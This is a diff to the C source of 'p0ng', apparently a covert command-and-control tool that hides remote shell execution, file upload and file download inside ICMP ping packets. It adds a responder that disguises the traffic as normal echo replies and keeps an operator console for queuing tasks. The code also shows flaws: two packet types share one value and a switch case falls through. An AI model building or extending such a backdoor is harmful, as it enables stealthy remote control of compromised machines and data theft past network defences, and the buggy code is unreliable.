@@ -24,15 +24,14 @@
 #define ICMP_DATA_LEN           48
 
 #define ICMP_REGULAR            0
-#define ICMP_UPLOAD             1
-#define ICMP_DOWNLOAD           2
-#define ICMP_SHELLCMD           3
-#define ICMP_UPLOAD_RESULT      4
-#define ICMP_DOWNLOAD_RESULT    5
-#define ICMP_SHELLCMD_RESULT    6
-#define ICMP_HEARTBEAT          7
-#define ICMP_HEARTBEAT_RESULT   8
-#define ICMP_BLANK              9
+#define ICMP_TASK_QUERY         1
+#define ICMP_NO_TASK            1
+#define ICMP_SHELLCMD           2
+#define ICMP_SHELLCMD_RESULT    3
+#define ICMP_UPLOAD             4
+#define ICMP_UPLOAD_RESULT      5
+#define ICMP_DOWNLOAD           6
+#define ICMP_DOWNLOAD_QUERY     7
 
 #define USLEEP_TIME             400
 
@@ -90,7 +89,7 @@ void set_current_work(uint8_t work_type,uint8_t *data, uint8_t data_length) {
 }
 
 void reset_current_work(){
-    (void)snprintf(current_work, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_BLANK, 0, 0, 0, "");
+    (void)snprintf(current_work, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_NO_TASK, 0, 0, 0, "");
 }
 
 uint8_t p0ng_pack(uint8_t *sendpacket, uint8_t pack_no, uint8_t icmp_type, uint8_t *buf, uint8_t len) {
@@ -126,18 +125,18 @@ uint8_t p0ng_check_recvdpkt(uint8_t *recvpacket, uint8_t recv_pkt_size, uint8_t 
     }
     if (st_icmp->icmp_type == ICMP_ECHOREPLY) {
         if (st_icmp->icmp_id != pid){
-            if(verbose||debug) printf("st_icmp->icmp_id:%u -- pid:(%u)\n",st_icmp->icmp_id,pid);
+            if(verbose||debug) printf("\r\033[Kst_icmp->icmp_id:%u -- pid:(%u)\n",st_icmp->icmp_id,pid);
             return 1;
         }
             
         if (memcmp(recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,sendpacket+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,ICMP_DATA_PRESERVE)!=0) {
-            if(verbose||debug) printf("Check ICMP_DATA_PRESERVE failure!\n");
+            if(verbose||debug) printf("\r\033[KCheck ICMP_DATA_PRESERVE failure!\n");
             return 1;
         }    
     }
     
     if (st_icmp->icmp_type == ICMP_ECHO) {
-        if(verbose||debug) printf("Recved ICMPECHO!\n");
+        if(verbose||debug) printf("\r\033[KRecved ICMPECHO!\n");
         return 1;
     }
     return 0;
@@ -175,12 +174,39 @@ uint8_t check_server(uint8_t seq_num){
     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
     recv_pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//默认等3秒
     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
-    if(recv_pkt_size==-1){
-        if(verbose||debug) printf("Connect timeout!\n");
+    if (recv_pkt_size==-1) {
+        if (verbose||debug) printf("Connect timeout!\n");
         return 1;
     }
     return p0ng_check_recvdpkt(recvpacket, recv_pkt_size, sendpacket, sendpacket_size);
 
+}
+
+void regular_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
+    uint8_t sendpkt[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
+    struct icmp *recv_icmp, *send_icmp;
+    unsigned long inaddr = 0l;
+    struct ip *recv_ip;
+    uint8_t iphdrlen;    
+    recv_ip = (struct ip *) recvpkt;
+    iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
+    recv_icmp = (struct icmp *) (recvpkt + iphdrlen); /*越过ip报头,指向ICMP报头*/
+//拼包开始
+    //ICMP头拼包
+    send_icmp = (struct icmp*)sendpkt;
+    memcpy(sendpkt,recvpkt+20,ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN);
+    send_icmp->icmp_type = ICMP_ECHOREPLY;
+    send_icmp->icmp_code = recv_icmp->icmp_code;
+    send_icmp->icmp_cksum = 0;
+    send_icmp->icmp_seq = recv_icmp->icmp_seq;
+    send_icmp->icmp_id = recv_icmp->icmp_id;
+    //ICMP头校验
+    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN); /*校验算法*/
+    //修改回包IP
+    inaddr = inet_addr(inet_ntoa(recv_ip->ip_src));
+    memcpy((char *) &dest_addr.sin_addr, (char*)&inaddr,sizeof(inaddr));
+
+    sendto(sockfd, sendpkt, ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
 }
 
 void p0ng_client(char *server_ip){
@@ -258,7 +284,7 @@ void p0ng_server(){
         st_ip = (struct ip *) recvpacket;
         strcpy(ip_src,inet_ntoa(st_ip->ip_src));
         strcpy(ip_dst,inet_ntoa(st_ip->ip_dst));
-        printf("\033[40;34m[@]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
+        if(verbose||debug) printf("\r\033[K\033[40;34m[@]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
         iphdr_len = st_ip->ip_hl << 2;
         icmptotal_len = pkt_size - iphdr_len;
         if( icmptotal_len < 8){
@@ -269,30 +295,30 @@ void p0ng_server(){
             pkt_type=recvpacket[iphdr_len+16+8];
         switch(pkt_type)
         {
-            case 4 :
-                if(verbose||debug) printf("stub upload!\n");
-                //upload_responcer(recvpacket, pkt_size);
-                break;
-            case 5 :
-                if(verbose||debug) printf("stub download!\n");
-                //download_responcer(recvpacket, pkt_size);
-                break;
-            case 6 :
-                if(verbose||debug) printf("stub execute!\n");
+            case ICMP_TASK_QUERY://处理客户端发来的任务请求，返回当前任务信息
+			    if(verbose||debug) printf("\r\033[Kstub task query!\n");
+				//current_task_responcer(recvpacket, pkt_size);//basic icmp-pktcheck
+            case ICMP_SHELLCMD_RESULT ://处理客户端发来的shell命令执行结果。
+                if(verbose||debug) printf("\r\033[Kstub execute!\n");
                 //execute_responcer(recvpacket, pkt_size);
                 break;
-            //@todo delete such case later
-            case 1 :
-            case 2 :
-            case 3 :
-            case 8 :
-                printf("[-]Oooops.Client send wrong packet\n");
-            case 7 :
-                if(verbose||debug) printf("stub slim heartbeats!\n");
+            case ICMP_UPLOAD_RESULT ://处理客户端发来的文件上传数据。
+                if(verbose||debug) printf("\r\033[Kstub upload!\n");
+                //upload_responcer(recvpacket, pkt_size);
                 break;
-            default :
-                if(verbose||debug) printf("stub default!\n");
-                //regular_responcer(recvpacket, pkt_size);
+            case ICMP_DOWNLOAD_QUERY ://处理客户端发来的文件下载请求，并返回文件数据。
+                if(verbose||debug) printf("\r\033[Kstub download!\n");
+                //download_responcer(recvpacket, pkt_size);
+                break;
+            //@todo delete such case later
+            case ICMP_SHELLCMD :
+            case ICMP_UPLOAD :
+            case ICMP_DOWNLOAD :
+                printf("\r\033[K\033[40;31m[-]\033[0mOooops.Received wrong type packet\n");
+            default ://处理正常的ICMP报文及其他情况。按照正常的ICMP响应来构造。
+                if(verbose||debug) printf("\r\033[KEntering func: regular_responcer.\n");
+                regular_responcer(recvpacket, pkt_size);
+				if(verbose||debug) printf("\r\033[KExit func: regular_responcer.\n");
                 
         }
         reset_current_work();
@@ -318,11 +344,11 @@ void p0ng_c2_main(){
         //p0ngcmd[sizeof(p0ngcmd)-1]='\0';//如果后期更改了ICMP_DATA_LEN，这里可以做溢出保护。
 
         //注意下面是根据输入设置当前的任务信息，存储在current_work中。client获取current_work后，server会重置当前任务。
-        if(strncmp(p0ngcmd,"shell ",6) == 0){//3
+        if(strncmp(p0ngcmd,"shell ",6) == 0){
             set_current_work(ICMP_SHELLCMD, p0ngcmd+6, strlen(p0ngcmd+6));
-        } else if (strncmp(p0ngcmd,"upload ",7) == 0){//1
+        } else if (strncmp(p0ngcmd,"upload ",7) == 0){
             set_current_work(ICMP_UPLOAD, p0ngcmd+7, strlen(p0ngcmd+7));
-        } else if (strncmp(p0ngcmd,"download ",9) == 0){//2
+        } else if (strncmp(p0ngcmd,"download ",9) == 0){
             set_current_work(ICMP_DOWNLOAD, p0ngcmd+9, strlen(p0ngcmd+9));
         } else if ((strcmp(p0ngcmd,"help\n") == 0)){
             print_usage();
